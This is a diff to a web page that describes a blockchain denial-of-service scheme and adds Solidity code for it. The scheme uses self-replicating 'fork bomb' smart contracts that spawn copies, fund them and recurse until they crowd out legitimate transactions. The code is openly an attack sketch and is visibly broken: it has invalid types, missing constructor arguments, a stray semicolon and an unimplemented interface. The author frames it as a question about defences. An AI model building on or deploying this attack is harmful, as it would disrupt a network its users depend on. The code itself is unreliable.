@@ -33,6 +33,37 @@
 							<hr/>
 							<div class="card-body">
 								<p>In Solidity (the programming language of smart contracts) it is possible to create and deploy smart contracts programmatically and to make transaction calls between the new and old version, therefore if a model was created to mimic a fork bomb, in which a contract would create copies of itself, pass along it's internal gas fee paying cryptocurrency to it's children along with the attackers wallet address, and call the same function in it's children to repeat the process. This would be connected to a web3 application that would reabsorb the currency of any stalled contracts and redeploy the original contract in a new address. This should lead to the maximum number of transactions of the network being used by the deployed smart contracts, thus preventing legitimate smart contracts from operating. Repeat for a long enough period of time and legitimate smart contact users will redeploy to another network, at which time an attacker can stop the attack and allow the network to languish from lack of users. I am interested in if anyone knows there to be any way to prevent this sort of attack, but it certainly seems significantly cheaper than a 51% attack.</p>
+								<code>
+									// SPDX-License-Identifier: MIT
+									pragma solidity ^0.8.0;
+
+									import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+									contract ForkBomb is IERC20{
+										address admin;
+										address token;
+										uint256 counter;
+										mapping(uint256=>ForkBomb) babyBombs;
+										ForkBomb childA;
+										ForkBomb childB;
+										function reproduce() internal {
+											for(uint256 i = 0; i < 32; i++){
+												babyBombs[i] = new ForkBomb();
+											}
+											for(uint256 i = 0; i < 32; i++){
+												IERC20(token).transfer(address(babyBombs[i]), IERC20(token).balanceOf(address(this)) * 0.03);
+												babyBombs[i].call(abi.encodeWithSignature("reproduce()"););
+											}
+										}
+										constructor(address memory _admin, address memory _token){
+											admin = _admin;
+											counter = 0;
+											token = _token;
+											reproduce();
+										}
+									}
+								</code>
+								<p>Code for educational purposes only.</p>
 							</div>
 						</div>
 					</div>
